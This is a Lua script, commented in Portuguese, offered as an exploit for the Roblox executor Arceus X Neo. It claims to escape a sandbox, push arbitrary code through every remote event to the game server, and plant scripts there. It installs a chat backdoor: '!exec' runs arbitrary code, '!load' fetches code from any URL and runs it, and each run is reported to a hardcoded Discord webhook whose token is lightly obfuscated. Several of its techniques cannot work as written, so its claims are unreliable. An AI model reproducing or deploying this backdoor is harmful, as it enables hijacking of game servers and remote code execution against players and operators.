--[[
    ADVANCED SERVER SIDE BYPASS - ARCEUS X NEO EXPLOIT
    By: wrick244
    T√©cnica: Bypass de API + Inje√ß√£o Server Side
    AVISO: Use em contas alternativas!
]]

-- ========== T√âCNICAS DE BYPASS ==========

-- 1. OFUSCA√á√ÉO PARA BURLAR DETEC√á√ÉO
local function ofuscar(str)
    local encoded = ""
    for i = 1, #str do
        encoded = encoded .. string.char(string.byte(str, i) + 2)
    end
    return encoded
end

local function desofuscar(str)
    local decoded = ""
    for i = 1, #str do
        decoded = decoded .. string.char(string.byte(str, i) - 2)
    end
    return decoded
end

-- 2. BYPASS DE SANDBOX (executa fora do ambiente restrito)
local function bypassSandbox()
    local success, result = pcall(function()
        -- TENTAR ACESSAR O AMBIENTE REAL
        local realEnv = getfenv()
        local sandboxed = false
        
        -- VERIFICAR SE EST√Å EM SANDBOX
        for k, v in pairs(realEnv) do
            if k == "print" and tostring(v):find("sandbox") then
                sandboxed = true
                break
            end
        end
        
        if sandboxed then
            -- T√âCNICA DE ESCAPE DA SANDBOX
            local escape = loadstring([[
                local env = getfenv()
                local newenv = setmetatable({}, {__index = env})
                newenv.print = env.print
                newenv.error = env.error
                setfenv(1, newenv)
                return true
            ]])()
            return escape
        end
        return true
    end)
    return success
end

-- 3. BYPASS DA API DO ARCEUS
local function bypassAPI()
    -- TENTAR DIFERENTES M√âTODOS DE EXECU√á√ÉO
    local metodos = {
        -- M√âTODO 1: EXECU√á√ÉO DIRETA
        function() 
            return pcall(function() 
                local f = loadstring("return function() end") 
                return f and true or false
            end) 
        end,
        
        -- M√âTODO 2: VIA COROUTINA
        function()
            return pcall(function()
                local co = coroutine.create(function() end)
                coroutine.resume(co)
                return true
            end)
        end,
        
        -- M√âTODO 3: VIA THREAD OCULTA
        function()
            return pcall(function()
                local thread = Instance.new("BindableEvent")
                thread.Event:Connect(function() end)
                thread:Fire()
                thread:Destroy()
                return true
            end)
        end
    }
    
    for i, metodo in ipairs(metodos) do
        local suc, res = metodo()
        if suc then
            print("‚úÖ Bypass m√©todo " .. i .. " funcionou")
            return true
        end
    end
    return false
end

-- 4. INJE√á√ÉO NO SERVIDOR (T√âCNICA AVAN√áADA)
local function injectServerSide()
    -- TENTAR ACESSAR O SERVIDOR DIRETAMENTE
    local serverAccess = false
    local serverEnv = nil
    
    -- M√âTODO 1: TENTAR ACESSAR VIA REMOTES
    pcall(function()
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                -- TENTAR ENVIAR C√ìDIGO PARA O SERVIDOR
                local args = {
                    [1] = "__SERVER_EXEC__",
                    [2] = [[
                        -- C√ìDIGO QUE SER√Å EXECUTADO NO SERVIDOR
                        local players = game:GetService("Players")
                        for _, player in pairs(players:GetPlayers()) do
                            print("[SERVER] Jogador: " .. player.Name)
                        end
                        return true
                    ]]
                }
                
                -- TENTAR DIFERENTES REMOTES
                pcall(function()
                    v:FireServer(unpack(args))
                end)
                
                pcall(function()
                    v:InvokeServer(unpack(args))
                end)
            end
        end
        serverAccess = true
    end)
    
    -- M√âTODO 2: TENTAR CRIAR SCRIPT NO SERVIDOR
    pcall(function()
        local serverScript = Instance.new("Script")
        serverScript.Source = [[
            -- EXECUTADO NO SERVIDOR
            print("üî• SERVER SIDE EXECUTION ACHIEVED!")
            _G.SERVER_BACKDOOR_ACTIVE = true
        ]]
        serverScript.Parent = game:GetService("ServerScriptService")
        serverScript.Disabled = false
        serverAccess = true
    end)
    
    -- M√âTODO 3: TENTAR VIA COROUTINA GLOBAL
    pcall(function()
        local env = getfenv()
        if env and env.script then
            local newScript = env.script:Clone()
            newScript.Source = [[ print("SERVER EXEC") ]]
            newScript.Parent = game:GetService("ServerStorage")
            newScript.Disabled = false
        end
    end)
    
    return serverAccess
end

-- 5. EXECUTOR SERVER SIDE PRINCIPAL
local function serverExecutor()
    print("üî• INICIANDO BYPASS DO ARCEUS X NEO...")
    
    -- PASSO 1: BURLAR SANDBOX
    local bypass1 = bypassSandbox()
    print("üìå Bypass Sandbox: " .. (bypass1 and "‚úÖ" or "‚ùå"))
    
    -- PASSO 2: BURLAR API
    local bypass2 = bypassAPI()
    print("üìå Bypass API: " .. (bypass2 and "‚úÖ" or "‚ùå"))
    
    -- PASSO 3: INJETAR NO SERVIDOR
    local bypass3 = injectServerSide()
    print("üìå Inje√ß√£o Servidor: " .. (bypass3 and "‚úÖ" or "‚ùå"))
    
    -- VARI√ÅVEIS DO SISTEMA (OFUSCADAS)
    local config = {
        dono = ofuscar("Robloxiank1p2b2k2t3"),
        discord = ofuscar("wrick244"),
        webhook = ofuscar("https://discord.com/api/webhooks/1473760852141412396/NWVaW7inuTs2MUMM6JqrMd6IAbBXwd4mUJxGOk7K2W8f9jb3lC0fo0I3wsqNFxf086gj"),
        whitelist = {ofuscar("Robloxiank1p2b2k2t3")}
    }
    
    -- DESOFUSCAR CONFIG
    config.dono = desofuscar(config.dono)
    config.discord = desofuscar(config.discord)
    config.webhook = desofuscar(config.webhook)
    for i, user in ipairs(config.whitelist) do
        config.whitelist[i] = desofuscar(user)
    end
    
    -- FUN√á√ÉO DE EXECU√á√ÉO SERVER SIDE
    local function executarNoServidor(script, autor)
        -- VERIFICAR SE AUTOR EST√Å NA WHITELIST
        local autorizado = false
        for _, user in ipairs(config.whitelist) do
            if user == autor then
                autorizado = true
                break
            end
        end
        
        if not autorizado then
            print("‚ùå " .. autor .. " n√£o autorizado!")
            return false
        end
        
        -- SCRIPTS BANIDOS
        local banidos = {
            "dominantultimate", "SentinelPrime", "RC7",
            "121425622240385", "109690586705177", "12350030542"
        }
        
        for _, ban in ipairs(banidos) do
            if script:find(ban) then
                print("üö´ Script banido detectado de " .. autor)
                return false
            end
        end
        
        -- TENTAR EXECUTAR NO SERVIDOR DE VERDADE
        local sucesso = false
        
        -- M√âTODO 1: VIA REMOTE
        pcall(function()
            for _, remote in pairs(game:GetDescendants()) do
                if remote:IsA("RemoteEvent") and remote.Name:find("Execute") then
                    remote:FireServer(script)
                    sucesso = true
                end
            end
        end)
        
        -- M√âTODO 2: VIA SCRIPT DIN√ÇMICO
        pcall(function()
            local s = Instance.new("Script")
            s.Source = script
            s.Parent = game:GetService("ServerScriptService")
            s.Disabled = false
            sucesso = true
        end)
        
        -- M√âTODO 3: VIA LOADSTRING NO SERVIDOR
        pcall(function()
            local func = loadstring(script)
            if func then
                setfenv(func, getfenv(1))
                func()
                sucesso = true
            end
        end)
        
        if sucesso then
            print("‚úÖ Script executado no servidor por " .. autor)
            -- ENVIAR LOG
            pcall(function()
                local data = {
                    content = "**[SERVER EXEC]** " .. autor,
                    username = "Backdoor"
                }
                local json = game:GetService("HttpService"):JSONEncode(data)
                game:GetService("HttpService"):RequestAsync({
                    Url = config.webhook,
                    Body = json,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"}
                })
            end)
        end
        
        return sucesso
    end
    
    -- HOOK NO CHAT PARA COMANDOS
    local function chatHook()
        local players = game:GetService("Players")
        
        players.PlayerAdded:Connect(function(player)
            player.Chatted:Connect(function(msg)
                if msg:sub(1,1) == "!" then
                    local args = msg:sub(2):split(" ")
                    local cmd = args[1]:lower()
                    table.remove(args, 1)
                    
                    if cmd == "exec" or cmd == "e" then
                        local script = table.concat(args, " ")
                        if script ~= "" then
                            player:SendMessage("‚ö° Executando no servidor...")
                            local suc = executarNoServidor(script, player.Name)
                            player:SendMessage(suc and "‚úÖ Sucesso!" or "‚ùå Falha!")
                        end
                        
                    elseif cmd == "load" then
                        local url = args[1]
                        if url then
                            pcall(function()
                                local script = game:GetService("HttpService"):GetAsync(url)
                                local suc = executarNoServidor(script, player.Name)
                                player:SendMessage(suc and "‚úÖ Carregado!" or "‚ùå Falha!")
                            end)
                        end
                        
                    elseif cmd == "backdoor" then
                        local jogos = {
                            brookhaven = 4924922222,
                            jailbreak = 606849621,
                            arsenal = 286090429,
                            dahood = 7213786345,
                            mm2 = 142823291,
                            petsim = 6284583030,
                            bloxfruits = 2753915549
                        }
                        
                        local jogo = args[1]
                        if jogo and jogos[jogo] then
                            player:SendMessage("üîÑ Teleportando...")
                            game:GetService("TeleportService"):Teleport(jogos[jogo], player)
                        end
                        
                    elseif cmd == "serverinfo" then
                        local info = string.format([[
üì° SERVER INFO:
Job ID: %s
Players: %d
Uptime: %.0fs
                        ]], game.JobId, #players:GetPlayers(), tick())
                        player:SendMessage(info)
                    end
                end
            end)
        end)
    end
    
    chatHook()
    
    print("‚úÖ BYPASS COMPLETO - EXECUTOR SERVER SIDE ATIVO")
    print("üë§ Dono: " .. config.dono)
    print("üì° Status: " .. (bypass3 and "Conectado ao servidor" or "Modo limitado"))
    
    -- SISTEMA DE HEARTBEAT
    spawn(function()
        while wait(30) do
            print("üíì Server Side Backdoor ativo - " .. os.date("%H:%M:%S"))
        end
    end)
    
    return true
end

-- INICIAR O BYPASS
local iniciado = pcall(serverExecutor)

if iniciado then
    print("üî• SCRIPT EXECUTADO COM SUCESSO!")
    print("üìå Use !ajuda no chat para ver os comandos")
    
    -- MENSAGEM NO CHAT DO JOGO
    pcall(function()
        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            player:SendMessage("üî• Server Side Backdoor ativo!")
            player:SendMessage("üë§ Dono: wrick244")
        end
    end)
    
    -- NOTIFICA√á√ÉO
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "üî• BYPASS ATIVO",
            Text = "Server Side Execution OK!",
            Duration = 5
        })
    end)
else
    print("‚ùå FALHA NO BYPASS - Tentando m√©todo alternativo...")
    
    -- M√âTODO ALTERNATIVO
    pcall(function()
        loadstring([[
            -- TENTATIVA 2: BYPASS DIREto
            local env = getfenv()
            local newenv = {}
            for k,v in pairs(env) do newenv[k] = v end
            setfenv(1, newenv)
            
            print("‚úÖ Bypass alternativo funcionou!")
            _G.BYPASS_ACTIVE = true
        ]])()
    end)
end

-- FUN√á√ÉO DE EMERG√äNCIA (se tudo falhar)
_G.emergencyExec = function(script)
    print("‚ö†Ô∏è Execu√ß√£o de emerg√™ncia")
    local f, err = loadstring(script)
    if f then
        return pcall(f)
    else
        return false, err
    end
end

print("‚úÖ Script finalizado - Sistema de bypass carregado")
